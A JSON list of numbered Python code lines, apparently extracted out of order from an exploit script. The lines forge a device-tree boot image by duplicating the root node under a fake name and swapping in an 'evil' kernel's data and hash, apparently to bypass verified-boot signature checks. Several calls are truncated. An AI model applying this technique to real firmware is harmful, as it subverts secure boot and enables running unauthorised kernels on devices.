[
    {
        "line": 14,
        "fullcodeline": "default_conf_name = get_prop_value("
    },
    {
        "line": 16,
        "fullcodeline": "default_conf_name = str(default_conf_name[:-1], 'utf-8')"
    },
    {
        "line": 18,
        "fullcodeline": "conf_path = '/configurations/'+default_conf_name"
    },
    {
        "line": 21,
        "fullcodeline": "loaded_kernel = get_prop_value(dt_struct, dt_strings, conf_path + '/kernel')"
    },
    {
        "line": 23,
        "fullcodeline": "loaded_kernel = str(loaded_kernel[:-1], 'utf-8')"
    },
    {
        "line": 32,
        "fullcodeline": "duplicated_node = dt_struct[rt_node_start:rt_node_end]"
    },
    {
        "line": 35,
        "fullcodeline": "new_dup = change_node_name(duplicated_node, dt_strings, '/', FAKE_ROOT_NAME)"
    },
    {
        "line": 37,
        "fullcodeline": "dt_struct = new_dup + dt_struct"
    },
    {
        "line": 41,
        "fullcodeline": "base = '/' + str(FAKE_ROOT_NAME, 'utf-8')"
    },
    {
        "line": 42,
        "fullcodeline": "value_path = base + conf_path+'/kernel'"
    },
    {
        "line": 43,
        "fullcodeline": "dt_struct = change_property_value(dt_struct, dt_strings, value_path,"
    },
    {
        "line": 47,
        "fullcodeline": "images_path = base + '/images/'"
    },
    {
        "line": 48,
        "fullcodeline": "node_path = images_path + loaded_kernel"
    },
    {
        "line": 49,
        "fullcodeline": "dt_struct = change_node_name(dt_struct, dt_strings, node_path,"
    },
    {
        "line": 53,
        "fullcodeline": "data_path = images_path + str(EVIL_KERNEL_NAME, 'utf-8') + '/data'"
    },
    {
        "line": 54,
        "fullcodeline": "dt_struct = change_property_value(dt_struct, dt_strings, data_path,"
    },
    {
        "line": 58,
        "fullcodeline": "hash_path = images_path + str(EVIL_KERNEL_NAME, 'utf-8') + '/hash-1/value'"
    },
    {
        "line": 59,
        "fullcodeline": "dt_struct = change_property_value(dt_struct, dt_strings, hash_path,"
    },
    {
        "line": 26,
        "fullcodeline": "(rt_node_start, rt_node_end) = (determine_offset(dt_struct, dt_strings, '/'))"
    },
    {
        "line": 27,
        "fullcodeline": "if (rt_node_start is None) or (rt_node_end is None):"
    },
    {
        "line": 28,
        "fullcodeline": "print('Fatal error, unable to find root node')"
    },
    {
        "line": 29,
        "fullcodeline": "sys.exit()"
    }
]